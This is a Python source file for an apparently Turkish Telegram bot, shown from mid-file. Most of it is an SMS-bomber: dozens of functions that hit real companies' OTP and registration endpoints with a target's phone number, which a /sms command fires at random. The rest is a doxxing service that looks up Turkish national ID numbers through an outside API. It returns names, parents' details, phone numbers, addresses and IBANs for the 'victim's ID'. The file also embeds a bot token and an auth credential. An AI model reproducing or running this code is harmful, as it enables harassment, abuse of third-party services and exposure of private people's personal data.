            "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "phone": f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = r.json()["isSucceed"]

        if r1:
            return True, "İkinci Yeni"
        else:
            return False, "İkinci Yeni"
    except:
        return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://www.migros.com.tr/rest/users/login/otp"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]

        if r1 == True:
            return True, "Migros"
        else:
            return False, "Migros"
    except:
        return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {
            "mobile_number": f"{number}",
            "token_type": "register_token"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Cepte Şok"
        else:
            return False, "Cepte Şok"
    except:
        return False, "Cepte Şok"



def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{number}",
                "challenge": str(uuid.uuid4()),
                "deviceUniqueId": f"web_{uuid.uuid4()}"
            },
            "query": """
            mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {
              generateOtp(
                phone: $phone
                challenge: $challenge
                deviceUniqueId: $deviceUniqueId
              )
            }
            """
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tıkla Gelsin"
        else:
            return False, "Tıkla Gelsin"
    except:
        return False, "Tıkla Gelsin"

def bisu(number):
    try:
        url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BiSU"
        else:
            return False, "BiSU"
    except:
        return False, "BiSU"

def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {
            "mobilePhoneNumber": f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        if r1 == "200 OK":
            return True, "File"
        else:
            return False, "File"
    except:
        return False, "File"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {
            "otp": "",
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İpragaz"
        else:
            return False, "İpragaz"
    except:
        return False, "İpragaz"

def pisir(number):
    try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        if r1 == "1":
            return True, "Pişir"
        else:
            return False, "Pişir"
    except:
        return False, "Pişir"

def coffy(number):
    try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phoneNumber": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Coffy"
        else:
            return False, "Coffy"
    except:
        return False, "Coffy"

def sushico(number):
    try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        if r1 == 0:
            return True, "SushiCo"
        else:
            return False, "SushiCo"
    except:
        return False, "SushiCo"

def kalmasin(number):
    try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Kalmasın"
        else:
            return False, "Kalmasın"
    except:
        return False, "Kalmasın"

def yotto(number):
    try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {
            "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 201:
            return True, "Yotto"
        else:
            return False, "Yotto"
    except:
        return False, "Yotto"

def qumpara(number):
    try:
        url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
        payload = {
            "msisdn" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Qumpara"
        else:
            return False, "Qumpara"
    except:
        return False, "Qumpara"

def aygaz(number):
    try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {
            "Gsm" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Aygaz"
        else:
            return False, "Aygaz"
    except:
        return False, "Aygaz"

def pawapp(number):
    try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId" : "2",
            "mobileInformation" : "",
            "data" : {
                "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement" : "true",
                "kvkk" : "true",
                "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo" : f"{number}",
                "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "PawAPP"
        else:
            return False, "PawAPP"
    except:
        return False, "PawAPP"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=2)
            
            if r1.status_code == 200:
                return True, "Mopaş"
            else:
                return False, "Mopaş"
        else:
            return False, "Mopaş"
    except:
        return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {
            "otp_code" : "null",
            "telefon_no" : f"90{number}",
            "reference_id" : "null"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        
        if r.status_code == 200:
            return True, "Paybol"
        else:
            return False, "Paybol"
    except:
        return False, "Paybol"

def ninewest(number):
    try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail" : False,
            "alertMeWithSms" : False,
            "dataPermission" : True,
            "email" : "asdafwqww44wt4t4@gmail.com",
            "genderId" : random.randint(0,3),
            "hash" : "5488b0f6de",
            "inviteCode" : "",
            "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
            "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
            "registerContract" : True,
            "registerMethod" : "mail",
            "version" : "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        
        if r1 == True:
            return True, "Nine West"
        else:
            return False, "Nine West"
    except:
        return False, "Nine West"

def saka(number):
    try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {
            "gsm" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == 1:
            return True, "Saka"
        else:
            return False, "Saka"
    except:
        return False, "Saka"

def superpedestrian(number):
    try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload = {
            "telefon_no" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        if r1 == "Ok":
            return True, "Superpedestrian"
        else:
            return False, "Superpedestrian"
    except:
        return False, "Superpedestrian"

def hayat(number):
    try:
        url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
        r = requests.post(url=url, timeout=5)
        r1 = json.loads(r.text)["IsSuccessful"]
        if r1 == True:
            return True, "Hayat"
        else:
            return False, "Hayat"
    except:
        return False, "Hayat"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {
            "cep_tel" : f"{number}",
            "cep_tel_ulkekod" : "90"
        }
        headers = {
            "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tazı"
        else:
            return False, "Tazı"
    except:
        return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {
            "country_code": "90",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "GoFody"
        else:
            return False, "GoFody"
    except:
        return False, "GoFody"

def weescooter(number):
    try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload = {
            "tenant": "62a1e7efe74a84ea61f0d588",
            "gsm": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Wee Scooter"
        else:
            return False, "Wee Scooter"
    except:
        return False, "Wee Scooter"

def scooby(number):
    try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Scooby"
        else:
            return False, "Scooby"
    except:
        return False, "Scooby"

def gez(number):
    try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        if r1 == True:
            return True, "Gez"
        else:
            return False, "Gez"
    except:
        return False, "Gez"

def heyscooter(number):
    try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
        headers = {"user-agent" : "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        if r1 == True:
            return True, "Hey Scooter"
        else:
            return False, "Hey Scooter"
    except:
        return False, "Hey Scooter"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Jetle"
        else:
            return False, "Jetle"
    except:
        return False, "Jetle"

def rabbit(number):
    try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {
            "mobile_number" : f"+90{number}",
            "os_name" : "android",
            "os_version" : "7.1.2",
            "app_version" : " 1.0.2(12)",
            "push_id" : "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == True:
            return True, "Rabbit"
        else:
            return False, "Rabbit"
    except:
        return False, "Rabbit"

def roombadi(number):
    try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{number}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Roombadi"
        else:
            return False, "Roombadi"
    except:
        return False, "Roombadi"

def hizliecza(number):
    try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Hızlı Ecza"
        else:
            return False, "Hızlı Ecza"
    except:
        return False, "Hızlı Ecza"

def signalall(number):
    try:
        url = "https://appservices.huzk.com/client/register"
        payload = {
            "name": "",
            "phone": {
                "number": f"{number}",
                "code": "90",
                "country_code": "TR",
                "name": ""
            },
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "SignalAll"
        else:
            return False, "SignalAll"
    except:
        return False, "SignalAll"

def goyakit(number):
    try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        if r1 == True:
            return True, "Go Yakıt"
        else:
            return False, "Go Yakıt"
    except:
        return False, "Go Yakıt"

def pinar(number):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {
            "MobilePhone" : f"{number}"
        }
        headers = {
            "devicetype" : "android",
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.text == True:
            return True, "Pınar"
        else:
            return False, "Pınar"
    except:
        return False, "Pınar"

def oliz(number):
    try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {
            "mobile_number" : f"{number}",
            "type" : None
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
        if r1 == "SUCCESS_SEND_SMS":
            return True, "Oliz"
        else:
            return False, "Oliz"
    except:
        return False, "Oliz"

def macrocenter(number):
    try:
        url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
        payload = {
            "phoneNumber" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]
        if r1 == True:
            return True, "Macro Center"
        else:
            return False, "Macro Center"
    except:
        return False, "Macro Center"

def marti(number):
    try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {
            "mobilePhone" : f"{number}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Martı"
        else:
            return False, "Martı"
    except:
        return False, "Martı"

def karma(number):
    try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {
            "phoneNumber" : f"90{number}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Karma"
        else:
            return False, "Karma"
    except:
        return False, "Karma"

def joker(number):
    try:
        url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
        payload = {
            "phone" : f"{number}"
        }
        headers = {
            "user-agent" : ""
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        r1 = json.loads(r.text)["success"]

        if r1 == True:
            return True, "Joker"
        else:
            return False, "Joker"
    except:
        return False, "Joker"

def hop(number):
    try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload = {
            "phone" : f"+90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Hop"
        else:
            return False, "Hop"
    except:
        return False, "Hop"

def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {
            "msisdn" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Kim GB Ister"
        else:
            return False, "Kim GB Ister"
    except:
        return False, "Kim GB Ister"


def anadolu(number):
    try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": number  # Number should be a string of digits
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            return True, "Anadolu"
        else:
            return False, "Anadolu"
    except:
        return False, "Anadolu"

def total(number):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
        r = requests.post(url=url, verify=False, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Total"
        else:
            return False, "Total"
    except:
        return False, "Total"

def englishhome(number):
    try:
        url = "https://www.englishhome.com:443/enh_app/users/registration/"
        payload = {
            "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
            "phone": f"0{number}",
            "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
            "email_allowed": False,
            "sms_allowed": False,
            "confirm": True,
            "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 202:
            return True, "English Home"
        else:
            return False, "English Home"
    except:
        return False, "English Home"

def petrolofisi(number):
    try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload = {
            "approvedContractVersion": "v1",
            "approvedKvkkVersion": "v1",
            "contractPermission": True,
            "deviceId": "",
            "etkContactPermission": True,
            "kvkkPermission": True,
            "mobilePhone": f"0{number}",
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
            "positiveCard": "",
            "referenceCode": "",
            "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        headers = {
            "X-Channel": "IOS"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 204:
            return True, "Petrol Ofisi"
        else:
            return False, "Petrol Ofisi"
    except:
        return False, "Petrol Ofisi"

TOKEN = ("7041067634:AAE4KTivODYQPSrFRKGQij_5UYtWotmRdpA")


bot = telebot.TeleBot(TOKEN)

print("BOT AKTİF EDİLDİ...")


@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return
        

    muzik = open('hosgeldiniz.mp3', 'rb')
    bot.send_audio(message.chat.id, muzik)
    muzik.close()

    response = f"🍀 Merhaba {user_name}, ({user_id})!\n\n📚 Tsg Oyun Botuna Hoş Geldin. Bu bot, Oyun İndirme Botudur Tamamen ücretsizdir\n\n📮 Sorgular Ücretsiz Olduğu İçin @TSGChecker Katılmak Zorunludur."

    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("📢 Tsg Kanal", url="https://t.me/TSGChecker"),
        telebot.types.InlineKeyboardButton("💭 Tsg Sohbet", url="https://t.me/TSGCheckerChat"),
        telebot.types.InlineKeyboardButton("👨🏼‍💻 İletişim", url="tg://user?id=6782067807"),
        telebot.types.InlineKeyboardButton("🔍 Komutlar", callback_data="commands")
    )

    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "commands")
def commands(call):
    response = "👨🏼‍💻 Komutlar Menüsü :"

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("Ad Soyad", callback_data="sorgu"),
        telebot.types.InlineKeyboardButton("Tc", callback_data="tc"),
        telebot.types.InlineKeyboardButton("Tc Plus", callback_data="tcplus"),
        telebot.types.InlineKeyboardButton("Tc Gsm", callback_data="tcgsm"),        
        telebot.types.InlineKeyboardButton("Aile", callback_data="aile"),
        telebot.types.InlineKeyboardButton("Aile Pro", callback_data="ailepro"),
       
        telebot.types.InlineKeyboardButton("Adres", callback_data="adres"),
                telebot.types.InlineKeyboardButton("İban", callback_data="iban"), 
        
        telebot.types.InlineKeyboardButton("okul no", callback_data="okulno"), 
        
        
        
        telebot.types.InlineKeyboardButton("sicil", callback_data="sicil"), 
        
        telebot.types.InlineKeyboardButton("burc", callback_data="burc"), 
        telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="back")
    )

    bot.edit_message_text(response, call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "back")
def back(call):
    start(call.message)
@bot.callback_query_handler(func=lambda call: call.data in ["sorgu", "tc", "tcplus", "tcgsm","aile","ailepro","adres","iban","okulno","sicil","burc"])
def other_commands(call):
    if call.data == "sorgu":
        response = "Ad Soyad Sorgu Yardım:\nörnek: /sorgu -isim Ahmet -soyisim Kaya -il Diyarbakır"
    elif call.data == "tc":
        response = "TC Sorgu Yardım:\nörnek: /tc 11111111110"
    elif call.data == "tcplus":
        response = "TC Plus Sorgu Yardım:\nörnek: /tcplus 11111111110"
    elif call.data == "tcgsm":
        response = "TC Gsm Sorgu Yardım:\nörnek: /tcgsm 11111111110" 
    elif call.data == "aile":
        response = "Aile Sorgu Yardım:\nörnek: /aile 11111111110"
    elif call.data == "ailepro":
        response = "Aile Pro Sorgu Yardım:\nörnek: /ailepro 11111111110"
    elif call.data == "adres":
        response = "Adres Sorgu Yardım:\nörnek: /adres 11111111110"              
    elif call.data == "iban":
        response = "İban Sorgu Yardım:\nörnek: /iban TR317377373722"
    elif call.data == "okulno":
        response = "Okul No Sorgu Yardım:\nörnek: /okulno 11111111110"    
    elif call.data == "sicil":
        response = "Sicil Sorgu Yardım:\nörnek: /sicil 11111111110"
    elif call.data == "burc":
        response = "Burc Sorgu Yardım:\nörnek: /burc 11111111110"


            

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="commands")
    )

    bot.edit_message_text(response, call.message.chat.id, call.message.message_id, reply_markup=markup)

def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(str(e))
        return False
        
        
        
        
      
        
        
        
@bot.message_handler(commands=["tc"])
def tc_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = (f"Merhaba {user_name}, ({user_id})!\n\n"
                    "Sorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\n"
                    "Kanal: @TSGChecker\nChat: @TSGCheckerChat")
        bot.send_message(message.chat.id, response)
        return
    mesaj = message.text
    if mesaj.startswith("/tc"):
        tc = mesaj.replace("/tc", "").strip()
        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/tc.php?tc={tc}"
            try:
                response = requests.get(api_url)
                if response.status_code == 200:
                    json_data = response.json()
                    if json_data.get("success", False):
                        data = json_data.get("data", {})
                        adi = data.get("ADI", "")
                        soyadi = data.get("SOYADI", "")
                        dogum_tarihi = data.get("DOGUMTARIHI", "")
                        nufus_il = data.get("NUFUSIL", "")
                        nufus_ilce = data.get("NUFUSILCE", "")
                        anne_adi = data.get("ANNEADI", "")
                        anne_tc = data.get("ANNETC", "")
                        baba_adi = data.get("BABAADI", "")
                        baba_tc = data.get("BABATC", "")
                        uyrugu = data.get("UYRUK", "Bilinmiyor")
                        
                        response_text = (f"╭━━━━━━━━━━━━━╮\n"
                                         f"┃➥ @TSGChecker\n"
                                         f"╰━━━━━━━━━━━━━╯\n"
                                         f"╭━━━━━━━━━━━━━━\n"
                                         f"┃➥ 𝖳𝖢: {tc}\n"
                                         f"┃➥ 𝖠𝖣𝖨: {adi}\n"
                                         f"┃➥ 𝖲𝖮𝖸 𝖠𝖣𝖨: {soyadi}\n"
                                         f"┃➥ 𝖣𝖮𝖦̆𝖴𝖬 𝖳𝖠𝖱𝖨𝖧𝖨: {dogum_tarihi}\n"
                                         f"┃➥ 𝖭𝖴𝖥𝖴𝖲𝖨𝖫: {nufus_il}\n"
                                         f"┃➥ 𝖭𝖴𝖥𝖴𝖲𝖨𝖫𝖢𝖤: {nufus_ilce}\n"
                                         f"┃➥ 𝖠𝖭𝖭𝖤 𝖠𝖣: {anne_adi}\n"
                                         f"┃➥ 𝖠𝖭𝖭𝖤 𝖳𝖢: {anne_tc}\n"
                                         f"┃➥ 𝖡𝖠𝖡𝖠 𝖠𝖣: {baba_adi}\n"
                                         f"┃➥ 𝖡𝖠𝖡𝖠 𝖳𝖢: {baba_tc}\n"
                                         f"┃➥ Uyruk: {uyrugu}\n"
                                         f"╰━━━━━━━━━━━━━━\n")
                        
                        bot.send_message(message.chat.id, response_text)
                    else:
                        cevap = "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯"
                        bot.send_message(message.chat.id, cevap)
                else:
                    cevap = f"Api Hata Kodu: {response.status_code}"
                    bot.send_message(message.chat.id, cevap)
            except Exception as e:
                cevap = f"Hata oluştu: {str(e)}"
                bot.send_message(message.chat.id, cevap)
        else:
            cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n│ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tc <kurbanın tc>\n╰──────────────────────╯"
            bot.send_message(message.chat.id, cevap)
    else:
        cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n│ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tc <kurbanın tc>\n╰──────────────────────╯"
        bot.send_message(message.chat.id, cevap)


@bot.message_handler(commands=['sms'])
def send_sms(message):
    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "𝐺𝑆𝑀 𝐺𝑖𝑟𝑖𝑛 𝑂̈𝑟𝑛: 555* 10")
        return
    telefon_no = args[0]
    sms_sayisi = random.uniform(1, 100)

    bot.reply_to(message, f"𝑆𝑀𝑆 𝑔𝑜̈𝑛𝑑𝑒𝑟𝑖𝑚𝑖 𝐵𝑎𝑠̧𝑙𝑎𝑑ı. 𝐵𝑖𝑡𝑡𝑖𝑔̆𝑖𝑛𝑑𝑒 𝐵𝑖𝑙𝑑𝑖𝑟𝑖𝑙𝑒𝑐𝑒𝑘!")

    for _ in range(sms_sayisi):
        servis_adi = random.choice(list(services.keys()))
        service = services[servis_adi]
        service(telefon_no)

    bot.reply_to(message, f"{sms_sayisi} 𝑎𝑑𝑒𝑡 𝑆𝑀𝑆 𝑔𝑜̈𝑛𝑑𝑒𝑟𝑖𝑚𝑖 𝑡𝑎𝑚𝑎𝑚𝑙𝑎𝑛𝑑ı.")
    

@bot.message_handler(commands=["tcplus"])
def tcplus_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    log_message = f"Yeni TC Plus Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.split(' ')[1]}\n" \
                  f"Sorgulayan ID: {user_id}\n" \
                  f"Sorgulayan Adı: {user_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = (f"Merhaba {user_name}, ({user_id})!\n\n"
                    f"Sorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. "
                    f"Kanal ve chate katılıp tekrar deneyin.\n\n"
                    f"Kanal: @TSGChecker\nChat: @TSGChecker")
        bot.send_message(message.chat.id, response)
        return

    

    mesaj = message.text

    if mesaj.startswith("/tcplus"):
        tc = mesaj.replace("/tcplus", "").strip()

        if tc:
            api_url = f"http://172.208.52.218/api/legaliapi/tcpro.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data.get("success") and "data" in json_data:
                    data = json_data["data"]
                    adi = data.get("ADI", "")
                    soyadi = data.get("SOYADI", "")
                    dogum_tarihi = data.get("DOGUMTARIHI", "")
                    nufus_il = data.get("NUFUSIL", "")
                    nufus_ilce = data.get("NUFUSILCE", "")
                    anne_adi = data.get("ANNEADI", "")
                    anne_tc = data.get("ANNETC", "")
                    baba_adi = data.get("BABAADI", "")
                    baba_tc = data.get("BABATC", "")
                    uyruk = data.get("UYRUK", "")

                    gsm_mesaj = ""
                    for gsm_numarasi in data.get("gsm", []):
                        gsm_mesaj += f"┃➥ GSM: {gsm_numarasi}\n"

                    response_text = (f"""
╭━━━━━━━━━━━━━╮
┃➥ @TSGChecker
╰━━━━━━━━━━━━━╯
╭━━━━━━━━━━━━━━╮
┃➥ TC: {tc}
